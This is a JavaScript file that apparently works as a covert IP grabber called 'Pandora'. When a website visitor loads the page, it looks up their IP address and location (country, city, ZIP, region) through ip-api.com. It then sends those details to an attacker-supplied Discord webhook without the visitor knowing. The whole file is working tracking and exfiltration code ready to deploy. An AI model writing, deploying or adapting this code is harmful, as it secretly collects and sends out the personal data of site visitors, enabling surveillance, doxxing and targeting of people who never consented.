const webhook = "your webhook url"

async function IP_Info(){
    /**
     *  Description: On init , fetches IP information of user
     *  @return {fetch.Body.json()} Resp Body
     */
    let response = await fetch("http://ip-api.com/json", {
      method: 'GET',
      headers: {
        "cache-control" : "no-cache",
        "content-type": "application/json"
      }
    })
    return response.json()
  }
  IP_Info().then((value)=> {
    let requiredInfo = [
      "status","country", "city", "zip", "regionName"
    ]
    let noData = false

    for(var i = 0; i < requiredInfo.length; i++){
      if(typeof(value[`${requiredInfo[i]}`]) === 'undefined'){
        noData = true
        break
      } 
    }
    if(noData){
      return null
    }
    return value
  }).then( async (value) => {
    if(value !== null){
       await fetch(webhook, {
        method: 'POST',
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content:"``New Pandora``",
          embeds: [{
              title: "Pandora IP",
              type:"rich",
              color: "12223968",
              description: "```IP information of the recent website visitor.```",
              fields: [{
                name: "IP", value: `${value.query}`, inline: false
              },
              {
                name: "Country", value: `${value.country}`, inline: false
              },
              {
                name: "City", value: `${value.city}`, inline: false
              },
              {
                name: "ZIP", value: `${value.zip}`, inline: false
              },
              {
                name: "Region", value: `${value.regionName}`, inline: false
              }
              ],
              footer: {
                text: "Programmed by prod.orzech",
                icon_url: "https://media.discordapp.net/attachments/1241105227826855997/1473801023326912716/ChatGPT_Image_17_lut_2026_17_29_12.png?ex=699787a9&is=69963629&hm=24fede7ef2d64f42cc6cd3d0a1b0d04e8f3c894fa6f15ca329323a883de04d21&=&format=webp&quality=lossless"
              },
              thumbnail: {
                url: "https://media.discordapp.net/attachments/1241105227826855997/1473801023326912716/ChatGPT_Image_17_lut_2026_17_29_12.png?ex=699787a9&is=69963629&hm=24fede7ef2d64f42cc6cd3d0a1b0d04e8f3c894fa6f15ca329323a883de04d21&=&format=webp&quality=lossless"
              }
          }]
        })
      }).then((value)=>{
        console.log(value.statusText)
      }).catch((err)=>{
        console.log(err)
      })
    }
  }).catch((err)=> {
    console.log(err)
    console.log('Request not sent')
  })
